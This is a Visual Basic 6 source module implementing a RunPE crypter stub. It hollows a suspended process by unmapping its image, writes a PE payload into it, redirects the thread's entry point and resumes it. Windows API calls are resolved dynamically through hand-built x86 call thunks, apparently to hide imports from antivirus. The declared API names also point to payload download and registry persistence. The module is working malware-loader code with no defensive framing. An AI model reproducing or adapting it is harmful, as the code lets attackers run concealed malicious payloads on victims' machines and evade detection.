Attribute VB_Name = "modAPI"
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)
Private mlngParameters() As Long
Private mlngAddress As Long
Private mbytCode() As Byte
Private mlngCP As Long

Private Type xbyte
    arr() As Byte
End Type

Private Const CONTEXT_X86 = &H10000
Private Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10)
Private Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)
Private Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)
Private Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)
Private Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)
Private Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)

Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Const SIZE_OF_80387_REGISTERS = 80
Private Const OFFSET_4 = 4294967296#

Private Const CREATE_SUSPENDED = &H4
Private Const MEM_COMMIT As Long = &H1000&
Private Const MEM_RESERVE As Long = &H2000&
Private Const PAGE_NOCACHE As Long = &H200
Private Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Private Const PAGE_EXECUTE As Long = &H10
Private Const PAGE_READONLY As Long = &H2
Private Const PAGE_WRITECOPY As Long = &H8
Private Const PAGE_NOACCESS As Long = &H1
Private Const PAGE_READWRITE As Long = &H4

'//---API Variables---//
    Public apiKernel32 As String
    Public apiNtdll As String
    Public apiWinInet As String
    Public apiADVAPI32 As String
    Public apiUrlMon As String
    
    Public apiZwUnmapViewOfSection As String
    
    Public apiCreateProcessA As String
    Public apiGetThreadContext As String
    Public apiReadProcessMemory As String
    Public apiVirtualAllocEx As String
    Public apiVirtualProtectEx As String
    Public apiWriteProcessMemory As String
    Public apiSetThreadContext As String
    Public apiResumeThread As String
    Public apiCloseHandle As String
    Public apiCopyFileA As String
    
    Public apiURLDownloadToFileA As String
    
    Public apiDeleteUrlCacheEntryA As String
    
    Public apiRegCloseKey As String
    Public apiRegSetValueExA As String
    Public apiPassword As String
'//---API Variables---//

'-------------------------------------------------------------------------------------------------------------
'Typer
Private Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     DataOffset As Long
     DataSelector As Long
     ErrorOffset As Long
     ErrorSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type

Private Type CONTEXT86
    ContextFlags As Long
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D
    IMAGE_OS2_SIGNATURE = &H454E
    IMAGE_OS2_SIGNATURE_LE = &H454C
    IMAGE_VXD_SIGNATURE = &H454C
    IMAGE_NT_SIGNATURE = &H4550
End Enum

Public Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    chars As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type


Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ImageBase As Long
    SectionAlignment As Long
    SubSystem As Integer
    Dllchars As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   chars  As Long
End Type


'-------------------------------------------------------------------------------------------------------------
'MAIN FUNCTIION
Public Function ExecMemory(ByVal TargetFile As String) As Long
    Dim context As CONTEXT86
    Dim ImageBase As Long, ret As Long, i As Long
    Dim addr As Long, lOffset As Long
    Dim ish As IMAGE_SECTION_HEADER
    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFO
    Dim idh As IMAGE_DOS_HEADER
    Dim inh As IMAGE_NT_HEADERS
    Dim abExeFile() As Byte
    
    abExeFile = bufFile
    CopyMemory idh, abExeFile(0), Len(idh)
    
    If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
       ExecMemory = 1
       Exit Function
    End If
    
    CopyMemory inh, abExeFile(idh.e_lfanew), Len(inh)
    
    If inh.Signature <> IMAGE_NT_SIGNATURE Then
       ExecMemory = 2
       Exit Function
    End If
    
    si.cb = Len(si)
    
    If CallAPI(apiKernel32, apiCreateProcessA, TargetFile, vbNullString, 0, 0, False, CREATE_SUSPENDED, 0, 0, VarPtr(si), VarPtr(pi)) = 0 Then
        ExecMemory = 3
        Exit Function
    End If
    
    context.ContextFlags = CONTEXT86_INTEGER
    
    If CallAPI(apiKernel32, apiGetThreadContext, pi.hThread, VarPtr(context)) = 0 Then GoTo ClearProcess
    'If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
    
    If CallAPI(apiKernel32, apiReadProcessMemory, pi.hProcess, context.Ebx + 8, VarPtr(addr), 4, 0) = 0 Then GoTo ClearProcess
    'Call ReadProcessMemory(pi.hProcess, ByVal context.Ebx + 8, addr, 4, 0)
    If addr = 0 Then GoTo ClearProcess
    
    If CallAPI(apiNtdll, apiZwUnmapViewOfSection, pi.hProcess, addr) Then GoTo ClearProcess
    'If ZwUnmapViewOfSection(pi.hProcess, addr) Then GoTo ClearProcess
    ImageBase = CallAPI(apiKernel32, apiVirtualAllocEx, pi.hProcess, inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    'ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If ImageBase = 0 Then GoTo ClearProcess
    
    
    Call CallAPI(apiKernel32, apiWriteProcessMemory, pi.hProcess, ImageBase, VarPtr(abExeFile(0)), inh.OptionalHeader.SizeOfHeaders, 0)
    'Call WriteProcessMemory(pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, ret)
    
    lOffset = idh.e_lfanew + Len(inh)
    For i = 0 To inh.FileHeader.NumberOfSections - 1
        CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
        
        Call CallAPI(apiKernel32, apiWriteProcessMemory, pi.hProcess, ImageBase + ish.VirtualAddress, VarPtr(abExeFile(ish.PointerToRawData)), ish.SizeOfRawData, 0)
        'Call WriteProcessMemory(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, abExeFile(ish.PointerToRawData), ish.SizeOfRawData, ret)
        
        Call CallAPI(apiKernel32, apiVirtualProtectEx, pi.hProcess, ImageBase + ish.VirtualAddress, ish.VirtualSize, Protect(ish.chars), addr)
        'Call VirtualProtectEx(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, Protect(ish.chars), addr)
    Next i
    
    Call CallAPI(apiKernel32, apiWriteProcessMemory, pi.hProcess, context.Ebx + 8, VarPtr(ImageBase), 4, 0)
    'Call WriteProcessMemory(pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, ret)
    
    context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
    Call CallAPI(apiKernel32, apiSetThreadContext, pi.hThread, VarPtr(context))
    'Call SetThreadContext(pi.hThread, context)
    
    'Call ResumeThread(pi.hThread)
    Call CallAPI(apiKernel32, apiResumeThread, pi.hThread)
    ExecMemory = 0 'Success
    Exit Function
ClearProcess:
    Call CallAPI(apiKernel32, apiCloseHandle, pi.hThread)
    Call CallAPI(apiKernel32, apiCloseHandle, pi.hProcess)
End Function

Private Function HögerSkift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
    HögerSkift = vbLongTillULong(lValue) / (2 ^ lNumberOfBitsToShift)
End Function

Private Function vbLongTillULong(ByVal Value As Long) As Double
    If Value < 0 Then
        vbLongTillULong = Value + OFFSET_4
    Else
        vbLongTillULong = Value
    End If
End Function

Private Function Protect(ByVal chars As Long) As Long
   Dim mapping As Variant
   mapping = Array(&H1, &H10, &H2, &H20, &H4, &H40, &H4, &H40)
   Protect = mapping(HögerSkift(chars, 29))
End Function
'-----------------------------------------------------------------------------------------------

Private Function CallRemote(libName As String, funcName As String, FuncParams() As Variant) As Long
    Dim lb As Long, i As Integer
    ReDim mlngParameters(0)
    ReDim mbytCode(0)
    mlngAddress = 0
    
    Dim X() As xbyte
    Dim wasString() As Boolean
    Dim IngaParametrar As Boolean
    ' förbered parametrarna
    If UBound(FuncParams()) = -1 Then
        IngaParametrar = True
        GoTo IngaParametrar
    End If
    On Error GoTo 0
    
    ReDim wasString(UBound(FuncParams()))
    For i = LBound(FuncParams()) To UBound(FuncParams())
        wasString(i) = False
        If VarType(FuncParams(i)) = vbString Then
            ReDim Preserve X(i)
            X(i).arr = StrConv(FuncParams(i), vbFromUnicode) & Chr(0)
            FuncParams(i) = VarPtr(X(i).arr(0))
            wasString(i) = True
        End If
    Next i
    
IngaParametrar:
   
    lb = LoadLibrary(ByVal libName)
    If lb = 0 Then
        Exit Function
    End If
    mlngAddress = GetProcAddress(lb, ByVal funcName)
    If mlngAddress = 0 Then
        FreeLibrary lb
        Exit Function
    End If
    
    ReDim mlngParameters(UBound(FuncParams) + 1)
    For i = 1 To UBound(mlngParameters)
        mlngParameters(i) = CLng(FuncParams(i - 1))
    Next i
    CallRemote = CallWindowProc(PrepareCode, 0, 0, 0, 0)
    FreeLibrary lb
    
    If IngaParametrar Then Exit Function
    
    For i = LBound(FuncParams()) To UBound(FuncParams())
        If wasString(i) Then
            FuncParams(i) = StrConv(X(i).arr(), vbUnicode)
        End If
    Next i
End Function

Private Function PrepareCode() As Long
    Dim lngX As Long, codeStart As Long
    ReDim mbytCode(18 + 32 + 6 * UBound(mlngParameters))
    codeStart = GetAlignedCodeStart(VarPtr(mbytCode(0)))
    mlngCP = codeStart - VarPtr(mbytCode(0))
    For lngX = 0 To mlngCP - 1
        mbytCode(lngX) = &HCC
    Next
    AddByteToCode &H58 'pop eax
    AddByteToCode &H59 'pop ecx
    AddByteToCode &H59 'pop ecx
    AddByteToCode &H59 'pop ecx
    AddByteToCode &H59 'pop ecx
    AddByteToCode &H50 'push eax
    For lngX = UBound(mlngParameters) To 1 Step -1
        AddByteToCode &H68 'push wwxxyyzz
        AddLongToCode mlngParameters(lngX)
    Next
    AddCallToCode mlngAddress
    AddByteToCode &HC3
    AddByteToCode &HCC
    PrepareCode = codeStart
End Function

Private Sub AddCallToCode(lngAddress As Long)
    AddByteToCode &HE8
    AddLongToCode lngAddress - VarPtr(mbytCode(mlngCP)) - 4
End Sub

Private Sub AddLongToCode(lng As Long)
    Dim intX As Integer
    Dim byt(3) As Byte
    CopyMemory byt(0), lng, 4
    For intX = 0 To 3
        AddByteToCode byt(intX)
    Next
End Sub

Private Sub AddByteToCode(byt As Byte)
    mbytCode(mlngCP) = byt
    mlngCP = mlngCP + 1
End Sub

Private Function GetAlignedCodeStart(lngAddress As Long) As Long
    GetAlignedCodeStart = lngAddress + (15 - (lngAddress - 1) Mod 16)
    If (15 - (lngAddress - 1) Mod 16) = 0 Then GetAlignedCodeStart = GetAlignedCodeStart + 16
End Function

'Huvudfunktion
Public Function CallAPI(libName As String, funcName As String, ParamArray FuncParams() As Variant) As Long
    Dim arr() As Variant
    arr() = FuncParams()
    
    CallAPI = CallRemote(libName, funcName, arr())
    
    Dim i As Long
    For i = LBound(FuncParams()) To UBound(FuncParams())
        FuncParams(i) = arr(i)
    Next i
End Function

